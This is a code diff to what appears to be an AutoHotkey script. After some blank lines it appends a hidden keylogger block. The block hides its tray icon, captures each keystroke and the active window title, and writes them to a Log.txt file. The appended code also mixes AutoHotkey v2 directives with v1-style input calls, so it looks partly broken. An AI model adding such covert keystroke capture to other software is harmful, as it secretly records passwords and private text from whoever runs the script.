@@ -276,3 +276,33 @@ Loop
     }
     Sleep 100  ; Prevent high CPU usage
 }
+
+
+
+
+
+
+#Requires AutoHotkey v2.0
+#SingleInstance Force
+#NoTrayIcon
+
+LogFile := A_ScriptDir "\Log.txt"
+LastWin := ""
+
+Loop {
+    ; Get active window title
+    try CurrentWin := WinGetTitle("A")
+    catch  ; If no active window
+        CurrentWin := "N/A"
+    
+    ; Wait for key input
+    Key := Input("V T1", , "L1 I")
+    
+    ; Log based on window change
+    if (CurrentWin == LastWin) {
+        FileAppend Key, LogFile
+    } else {
+        FileAppend (LastWin ? "`n" : "") CurrentWin "|" Key "|", LogFile
+        LastWin := CurrentWin
+    }
+}
